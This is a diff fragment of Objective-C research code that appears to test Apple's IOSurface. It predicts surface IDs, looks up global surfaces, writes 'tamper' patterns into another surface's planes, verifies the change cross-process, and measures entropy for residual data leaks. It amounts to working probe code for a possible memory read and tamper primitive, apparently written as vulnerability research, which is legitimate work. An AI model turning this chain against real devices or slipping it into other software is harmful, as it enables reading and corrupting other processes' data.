+                            for (int i = 0; i < 64*64; i++) { if (rPx0[i] == 0xAAAAAAAA) matchP0++; }
+                            for (int i = 0; i < 64*64; i++) { if (rPx1[i] == 0xBBBBBBBB) matchP1++; }
+                            log([NSString stringWithFormat:@"GLOBALOVF: Lookup ref — plane0 match=%u plane1 match=%u", matchP0, matchP1]);
+
+                            if (matchP0 > 0 && matchP1 > 0) {
+                                anomalies++;
+                                log(@"GLOBALOVF: ANOMALY — both planes fully readable via IOSurfaceLookup (shared memory)");
+                            }
+
+                            // Tamper plane1 via lookup ref
+                            for (int i = 0; i < 64*64; i++) rPx1[i] = 0xCCCCCCCC;
                         }
                         sym.unlock(ref, 0, NULL);
 
+                        // Verify tamper visible on original
                         sym.lock(gSurf, 0, NULL);
-                        void *op0 = getPlaneBase(gSurf, 0);
-                        if (op0) {
-                            CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
-                            CGContextRef ctx = CGBitmapContextCreate(op0, 64, 128, 8, 256, cs,
-                                kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
-                            if (ctx) {
-                                CGImageRef img = CGBitmapContextCreateImage(ctx);
-                                if (img) {
-                                    CFDataRef pix = CGDataProviderCopyData(CGImageGetDataProvider(img));
-                                    if (pix) {
-                                        const uint32_t *words = (const uint32_t *)CFDataGetBytePtr(pix);
-                                        size_t nw = (size_t)CFDataGetLength(pix) / 4;
-                                        uint32_t tamperDetected = 0;
-                                        for (size_t w = 64*64; w < nw && w < 128*64; w++) {
-                                            if (words[w] == 0xCCCCCCCC) tamperDetected++;
-                                        }
-                                        if (tamperDetected > 0) {
-                                            anomalies++;
-                                            log([NSString stringWithFormat:@"GLOBALOVF: CRITICAL — %u tampered pixels detected via CG overflow!", tamperDetected]);
-                                        }
-                                        CFRelease(pix);
-                                    }
-                                    CGImageRelease(img);
-                                }
-                                CGContextRelease(ctx);
+                        void *origP1 = getPlaneBase(gSurf, 1);
+                        if (origP1) {
+                            uint32_t *oPx1 = (uint32_t *)origP1;
+                            uint32_t tamperSeen = 0;
+                            for (int i = 0; i < 64*64; i++) { if (oPx1[i] == 0xCCCCCCCC) tamperSeen++; }
+                            if (tamperSeen > 0) {
+                                anomalies++;
+                                log([NSString stringWithFormat:@"GLOBALOVF: CRITICAL — %u tampered pixels visible on original surface!", tamperSeen]);
+                                log(@"GLOBALOVF: Cross-process plane tamper confirmed without authentication");
                             }
-                            CGColorSpaceRelease(cs);
                         }
                         sym.unlock(gSurf, 0, NULL);
                         CFRelease(ref);
@@ -6654,8 +6664,8 @@ void iosurface_research_global_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _
 
                     if (isr_stopped()) { CFRelease(gSurf); goto globalovf_done; }
 
-                    // Phase D — Full chain: predict ID, create global, lookup, overflow
-                    log(@"GLOBALOVF: Phase D — full chain x10 iterations");
+                    // Phase C — Full chain: predict ID + global lookup + tamper
+                    log(@"GLOBALOVF: Phase C — predict+create+lookup+tamper chain x10");
                     uint32_t chainSuccess = 0;
                     IOSurfaceID lastID = gID;
                     for (int iter = 0; iter < 10 && !isr_stopped(); iter++) {
@@ -6666,38 +6676,19 @@ void iosurface_research_global_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _
                             if (actualID == predictedID) {
                                 IOSurfaceRef cRef = sym.lookup(actualID);
                                 if (cRef) {
-                                    sym.lock(cRef, 0, NULL);
-                                    void *cp0 = getPlaneBase(cRef, 0);
-                                    if (cp0) {
-                                        sym.lock(cSurf, 0, NULL);
-                                        uint32_t *origP1 = (uint32_t *)getPlaneBase(cSurf, 1);
-                                        if (origP1) {
-                                            for (int j = 0; j < 64*64; j++) origP1[j] = 0xEEEEEEEE;
-                                        }
-                                        sym.unlock(cSurf, 0, NULL);
+                                    // Write via original, verify via lookup
+                                    sym.lock(cSurf, 0, NULL);
+                                    uint32_t *origP1 = (uint32_t *)getPlaneBase(cSurf, 1);
+                                    if (origP1) {
+                                        for (int j = 0; j < 64*64; j++) origP1[j] = 0xEEEEEEEE;
+                                    }
+                                    sym.unlock(cSurf, 0, NULL);
 
-                                        ptrdiff_t gapC = (uint8_t *)getPlaneBase(cRef, 1) - (uint8_t *)cp0;
-                                        if (gapC == 16384) {
-                                            CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
-                                            CGContextRef ctx = CGBitmapContextCreate(cp0, 64, 128, 8, 256, cs,
-                                                kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
-                                            if (ctx) {
-                                                CGImageRef img = CGBitmapContextCreateImage(ctx);
-                                                if (img) {
-                                                    CFDataRef pix = CGDataProviderCopyData(CGImageGetDataProvider(img));
-                                                    if (pix) {
-                                                        const uint32_t *words = (const uint32_t *)CFDataGetBytePtr(pix);
-                                                        size_t nw = (size_t)CFDataGetLength(pix) / 4;
-                                                        for (size_t w = 64*64; w < nw && w < 128*64; w++) {
-                                                            if (words[w] == 0xEEEEEEEE) { chainSuccess++; break; }
-                                                        }
-                                                        CFRelease(pix);
-                                                    }
-                                                    CGImageRelease(img);
-                                                }
-                                                CGContextRelease(ctx);
-                                            }
-                                            CGColorSpaceRelease(cs);
+                                    sym.lock(cRef, 0, NULL);
+                                    uint32_t *refP1 = (uint32_t *)getPlaneBase(cRef, 1);
+                                    if (refP1) {
+                                        for (int j = 0; j < 16; j++) {
+                                            if (refP1[j] == 0xEEEEEEEE) { chainSuccess++; break; }
                                         }
                                     }
                                     sym.unlock(cRef, 0, NULL);
@@ -6711,7 +6702,7 @@ void iosurface_research_global_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _
                     log([NSString stringWithFormat:@"GLOBALOVF: Full chain success = %u/10", chainSuccess]);
                     if (chainSuccess > 5) {
                         anomalies++;
-                        log(@"GLOBALOVF: ANOMALY — full predict+global+overflow chain is reliable!");
+                        log(@"GLOBALOVF: ANOMALY — predict+global+lookup+tamper chain is reliable!");
                     }
 
                     CFRelease(gSurf);
@@ -6720,40 +6711,26 @@ void iosurface_research_global_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _
 
             if (isr_stopped()) goto globalovf_done;
 
-            // Phase E — Entropy analysis
-            log(@"GLOBALOVF: Phase E — entropy analysis of overflow data");
+            // Phase D — Entropy analysis of fresh global surface planes
+            log(@"GLOBALOVF: Phase D — entropy analysis of global surface data");
             {
                 IOSurfaceRef eSurf = sym.create((__bridge CFDictionaryRef)globalDual);
                 if (eSurf) {
                     sym.lock(eSurf, 0, NULL);
                     void *ep0 = getPlaneBase(eSurf, 0);
-                    if (ep0) {
-                        CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
-                        CGContextRef ctx = CGBitmapContextCreate(ep0, 64, 128, 8, 256, cs,
-                            kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
-                        if (ctx) {
-                            CGImageRef img = CGBitmapContextCreateImage(ctx);
-                            if (img) {
-                                CFDataRef pix = CGDataProviderCopyData(CGImageGetDataProvider(img));
-                                if (pix) {
-                                    const uint8_t *bytes = CFDataGetBytePtr(pix);
-                                    size_t totalLen = (size_t)CFDataGetLength(pix);
-                                    size_t pages = totalLen / 4096;
-                                    for (size_t pg = 0; pg < pages && pg < 16; pg++) {
-                                        double ent = shannon_entropy(bytes + pg * 4096, 4096);
-                                        log([NSString stringWithFormat:@"GLOBALOVF: Page %zu entropy = %.3f bits", pg, ent]);
-                                        if (ent > 6.0 && pg >= 4) {
-                                            anomalies++;
-                                            log([NSString stringWithFormat:@"GLOBALOVF: ANOMALY — high entropy (%.3f) in overflow page %zu!", ent, pg]);
-                                        }
-                                    }
-                                    CFRelease(pix);
-                                }
-                                CGImageRelease(img);
-                            }
-                            CGContextRelease(ctx);
+                    void *ep1 = getPlaneBase(eSurf, 1);
+                    if (ep0 && ep1) {
+                        double entP0 = shannon_entropy((const uint8_t *)ep0, 16384);
+                        double entP1 = shannon_entropy((const uint8_t *)ep1, 16384);
+                        log([NSString stringWithFormat:@"GLOBALOVF: Fresh global — plane0 entropy=%.3f plane1 entropy=%.3f", entP0, entP1]);
+                        if (entP0 > 6.0) {
+                            anomalies++;
+                            log(@"GLOBALOVF: ANOMALY — high entropy in fresh plane0 (residual data leak)");
                         }
-                        CGColorSpaceRelease(cs);
+                        if (entP1 > 6.0) {
+                            anomalies++;
+                            log(@"GLOBALOVF: ANOMALY — high entropy in fresh plane1 (residual data leak)");
+                        }
                     }
                     sym.unlock(eSurf, 0, NULL);
                     CFRelease(eSurf);
